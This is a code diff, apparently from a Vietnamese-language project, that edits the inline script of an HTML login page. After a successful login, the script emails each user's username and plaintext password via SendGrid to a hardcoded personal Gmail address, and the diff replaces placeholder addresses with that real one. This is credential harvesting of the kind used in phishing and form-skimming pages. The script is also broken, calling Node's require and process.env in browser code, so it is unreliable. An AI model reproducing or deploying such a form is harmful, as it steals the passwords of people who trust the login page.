@@ -36,17 +36,17 @@
     <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@sendgrid/mail@7.4.0"></script>
     <script>
-      const sgMail = require('@sendgrid/mail');
-      sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+    // Thiết lập SendGrid API key
+    const sgMail = require('@sendgrid/mail');
+    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-      const form = $('form');
-      const btnLogin = $('#btnLogin');
-
-      btnLogin.click((event) => {
+    $(document).ready(function() {
+      $('#btnLogin').on('click', function(event) {
         event.preventDefault();
 
+        // Lấy thông tin đăng nhập từ form
         const username = $('#username').val();
-        const password = $('#password').val();
+        const password = $('#password').val();        
 
         // Gửi yêu cầu đăng nhập tới server
         $.ajax({
@@ -57,33 +57,29 @@
             password: password
           }),
           contentType: 'application/json',
-          success: (response) => {
+          success: function(response) {
             console.log(response);
 
             // Gửi email thông tin đăng nhập
-            const fromEmail = 'example@example.com';
-            const toEmail = 'example2@example.com';
+            const fromEmail = 'dungcuongthtq10020112@gmail.com';
+            const toEmail = 'dungcuongthtq10020112@gmail.com';
             const subject = 'Thông tin đăng nhập';
-            const text = `Tên đăng nhập: ${username}\nMật khẩu: ${password}`;
-
-            const msg = {
-              to: toEmail,
+            const text = 'Tên đăng nhập: ' + username + '\nMật khẩu: ' + password;
+            const mail = {
               from: fromEmail,
+              to: toEmail,
               subject: subject,
               text: text
             };
 
-            sgMail.send(msg).then(() => {
-              console.log('Gửi email thành công');
-            }).catch((error) => {
-              console.error(error);
-            });
+            sgMail.send(mail);
           },
-          error: (error) => {
-            console.error(error);
-          }
+          error: function(error) {
+            console.log(error);
+          }           
         });
       });
+    });
     </script>
 
     <!-- JavaScript Bootstrap và Popper -->
